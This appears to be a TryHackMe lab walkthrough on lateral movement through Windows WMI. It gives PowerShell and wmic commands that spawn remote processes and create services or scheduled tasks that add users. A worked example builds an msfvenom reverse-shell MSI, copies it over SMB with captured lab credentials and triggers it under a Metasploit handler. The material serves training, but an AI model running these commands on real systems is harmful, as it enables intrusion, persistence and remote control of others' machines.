We can also perform many techniques discussed in the previous task differently by using Windows Management Instrumentation (WMI). WMI is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices.

In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways.

## Connecting to WMI From Powershell
Before being able to connect to WMI using Powershell commands, we need to create a *PSCredential* object with our user and password. This object will be stored in the `$credential` variable.

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:
- ***DCOM*:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
- ***Wsman*:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI session from Powershell, we can use the following commands and store the session on the `$Session` variable, which we will use throughout the room on the different techniques:
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName {TARGET} -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.


## Remote Process Creation Using WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
- **Required Group Memberships:** Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:
```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Note:
	 WMI won't allow you to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be done using wmic from the command prompt:
```shell-session
wmic.exe /user:Administrator /password:Mypass123 /node:{TARGET} process call create "cmd.exe /c calc.exe" 
```

## Remote Services Creation with WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

We can get a handle on the service and start it with the following commands:
```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

 We can stop and delete the service with the following commands:
 ```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Remote Scheduled Tasks Creation with WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add" # Your payload

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

To delete the scheduled task after it has been used, we can use the following command:
  ```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

## Installing MSI packages through WMI
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

We can achieve the same by us using wmic in legacy systems:
```shell-session
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```


## Example
To complete this exercise, you will need to connect to *THMJMP2* using the credentials assigned to you. Once you have your credentials, connect to *THMJMP2* via SSH:
`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:
- **User:** ZA.TRYHACKME.COM\t1_corine.waters
- **Password:** Korine.1994

We'll show how to use those credentials to move laterally to THM-IIS using *WMI* and *MSI* packages. Feel free to try the other methods presented during this task.

We will start by creating our *MSI* *payload* with msfvenom from our attacker machine:
```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={lateralmovement} LPORT={4445} -f msi > {myinstaller.msi}
```

We then copy the payload using *SMB* or any other method available:
```shell-session
user@AttackBox$ smbclient -c 'put {myinstaller.msi}' -U {t1_corine.waters} -W ZA '{//thmiis.za.tryhackme.com/admin$/}' {Korine.1994}
```

Since we copied our payload to the *ADMIN$* share, it will be available at `C:\Windows\` on the server. 

We start a handler to receive the reverse shell from Metasploit:
```shell-session
msf6 exploit(multi/handler) > set LHOST {lateralmovement}
msf6 exploit(multi/handler) > set LPORT {4445}
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 
```

Let's start a *WMI* session against *THMIIS* from a Powershell console:

THMJMP2: Powershell
```shell-session
PS C:\> $username = '{t1_corine.waters}';
PS C:\> $password = '{Korine.1994}';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName {thmiis.za.tryhackme.com} -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

We then invoke the Install method from the *Win32_Produc*t class to trigger the payload:

THMJMP2: Powershell
```shell-session
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\{myinstaller.msi}"; Options = ""; AllUsers = $false}
```
